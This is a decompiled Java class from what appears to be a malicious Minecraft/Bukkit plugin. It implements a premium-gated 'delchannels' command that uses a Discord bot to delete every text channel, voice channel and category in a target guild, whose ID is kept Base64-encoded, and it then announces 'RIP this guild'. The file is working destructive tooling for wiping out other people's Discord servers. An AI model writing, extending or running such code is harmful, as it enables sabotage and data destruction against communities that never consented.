/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium.bot;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.Base64;

import net.dv8tion.jda.api.entities.Guild;
import org.bukkit.entity.Player;

public class DelchannelsCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (plugin.botEnabled) {
                byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild guild = plugin.jda.getGuildById(new String(u2));
                if (guild == null) {
                    p2.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    guild.getTextChannels().forEach(c2 -> c2.delete().complete());
                    guild.getVoiceChannels().forEach(c2 -> c2.delete().complete());
                    guild.getCategories().forEach(c2 -> c2.delete().complete());
                    p2.sendMessage(Settings.PREFIX("RIP this guild"));
                }
            } else {
                p2.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

